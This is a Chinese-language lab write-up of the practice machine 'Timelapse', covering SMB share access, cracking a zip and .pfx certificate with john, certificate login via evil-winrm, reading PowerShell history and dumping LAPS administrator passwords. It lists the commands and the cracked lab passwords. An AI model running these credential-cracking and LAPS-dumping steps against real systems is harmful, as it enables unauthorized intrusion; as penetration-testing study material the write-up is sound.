# Timelapse

- 練習日期:   2026/03/19
- 考點:       SMB、PKI 憑證處理、WINRM 憑證登入、PowerShell 歷史紀錄、LAPS

## SMB

一如往常，看到 445 直接開啟 smb 掃描模式，掃描後用 smbclient 連線，看到什麼幹什麼下來：

```bash
nxc smb dc01.timelapse.htb -u 'guest' -p '' --shares
smbclient //10.129.226.200/Share
```

> 這裡可以注意一下，如果一開始使用 ip 掃描 timeout 的話，可以嘗試在 /etc/hosts 中加入 domain name，避免因為無法對應而出錯。
發現檔案 winrm_backup.zip

## PKI 憑證處理

winrm_backup.zip 看起來就香香的，首先要想辦法把裡面的資料爬出來，分為兩個步驟：

1. 把 zip 裡面的 .pfx 檔案解密出來
    
    使用 john the ripper 來解。
    
    ```bash
    zip2john winrm_backup.zip > winrm_backup.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
    ```

    找到解壓縮密碼：supremelegacy

2. 從 .pfx 檔案中把憑證和私鑰找出來
    
    再次出動 john the ripper 來解 .pfx 檔案。
    
    ```bash
    pfx2john winrm_backup.pfx > winrm_backup_pfx.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup_p
    ```

    找到私鑰密碼：thuglegacy

    接著使用 openssl 來把 .pfx 檔案解密出來，得到憑證 (.crt) 和私鑰 (.key)：

    ```bash
    openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes
    openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
    ```

    - pkcs12: 是一種用來儲存和傳輸加密資料的格式。
    - in/out: 指定輸入和輸出的檔案。
    - nocerts: 「No Certificates」表示不輸出憑證，只輸出私鑰。
    - nodes: 「No DES」表示不對私鑰進行加密，直接以明文形式輸出，否則之後連線還要再 key 密碼很麻煩。
    - clcerts: 表示只輸出用戶端憑證。
    - nokeys: 表示不輸出私鑰，只輸出憑證。

    使用 winrm 的憑證登入功能來登入：

    ```bash
    evil-winrm -i 10.129.226.200 -S -c legacyy.crt -k legacyy.key
    ```

    - S (SSL): 使用憑證必須走 HTTPS，因此需要加上 -s 走 Port 5986。

## PowerShell 歷史紀錄

Windows 的 PowerShell 歷史[記錄檔](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)是 `ConsoleHost_history.txt`，相當於 Linux 中的 .bash_history，通常儲存會儲存在 `C:\Users\{username}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\` 底下。

```bash
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
type ConsoleHost_history.txt

## 也可以直接查位置在哪裡
Get-PSReadlineOption
```

## LAPS

LAPS (Local Administrator Password Solution) 是 Microsoft 提供的一種解決方案，避免 IT 人員為了方便管理，在公司所有的電腦裡，設定一組一模一樣的本機 Administrator 密碼。LAPS 會定期自動生成和更新本地管理員帳戶的密碼，並將其安全地儲存在 Active Directory 中一個叫 ms-Mcs-AdmPwd 的隱藏屬性中，只有授權的使用者或群組才能存取這些密碼。

net user svc_deploy 發現有 LAPS_Readers 的權限，可以使用兩種方式取得密碼：

```bash
nxc ldap 10.129.226.200 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```
- -M laps 模組可以直接從 Active Directory 中撈出 ms-Mcs-AdmPwd 的值，也就是本機 Administrator 的密碼。

如果已經以 svc_deploy 的身份登入了其中一台電腦，也可以使用 PowerShell 的 Get-ADComputer cmdlet 來查詢 ms-Mcs-AdmPwd 屬性：

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd
```